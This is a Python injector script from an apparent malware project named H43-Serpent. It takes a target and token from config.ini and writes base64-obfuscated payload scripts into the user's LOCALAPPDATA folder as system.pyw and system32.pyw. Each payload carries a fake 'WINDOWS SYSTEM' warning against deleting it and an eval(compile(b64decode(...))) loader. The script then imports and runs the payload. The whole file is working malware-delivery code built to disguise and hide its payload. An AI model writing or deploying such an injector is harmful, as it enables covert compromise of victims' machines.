'''                                                
 _____ ___ ___     _____                     _   
|  |  | | |_  |___|   __|___ ___ ___ ___ ___| |_ 
|     |_  |_  |___|__   | -_|  _| . | -_|   |  _|
|__|__| |_|___|   |_____|___|_| |  _|___|_|_|_|  
                                |_|              


Author: Fytex
REPO: https://github.com/Fytex/H43-Serpent
'''


# Avoid using Pip so injection:
# -> is fast as possible
# -> doesn't stall without internet connection
import os
import sys
import base64
import importlib
import configparser

MAIN = 'system'
LIB = 'system32'

SCRIPTS_FOLDER = 'scripts'
MAIN_SCRIPT_NAME = MAIN + '.pyw'
LIB_SCRIPT_NAME = LIB + '.pyw'

config = configparser.ConfigParser()
config.read('config.ini')
TARGET = config['CONFIGS']['TARGET']
TOKEN = config['CONFIGS']['TOKEN']

d = os.getenv("LOCALAPPDATA")


file_base64_content = '''\'\'\'
WINDOWS SYSTEM

[Warning]
Deleting this system\'s file can make your computer malfunction.
Action is irreversible.
\'\'\'


import base64
eval(compile(base64.b64decode({}),\'<string>\',\'exec\'))
'''


with open(os.path.join(SCRIPTS_FOLDER, MAIN_SCRIPT_NAME)) as from_file:
    TARGET_VAR = from_file.readline().split('=')[0]
    TOKEN_VAR = from_file.readline().split('=')[0]
    LIB_VAR = from_file.readline().split('=')[0]
    
    replacement_line = f'{TARGET_VAR}= \'{TARGET}\'\n{TOKEN_VAR}= \'{TOKEN}\'\n{LIB_VAR}= \'{LIB}\'\n'
    text = replacement_line + from_file.read()
    encoded = base64.b64encode(text.encode())


with open(os.path.join(d, MAIN_SCRIPT_NAME), 'w') as to_file:  
    to_file.write(file_base64_content.format(encoded))



with open(os.path.join(SCRIPTS_FOLDER, LIB_SCRIPT_NAME)) as from_file:
    text = from_file.read()
    encoded = base64.b64encode(text.encode())


with open(os.path.join(d, LIB_SCRIPT_NAME), 'w') as to_file:  
    to_file.write(file_base64_content.format(encoded))



os.chdir(d)
sys.path.insert(0, d)

importlib.import_module(MAIN_SCRIPT_NAME)



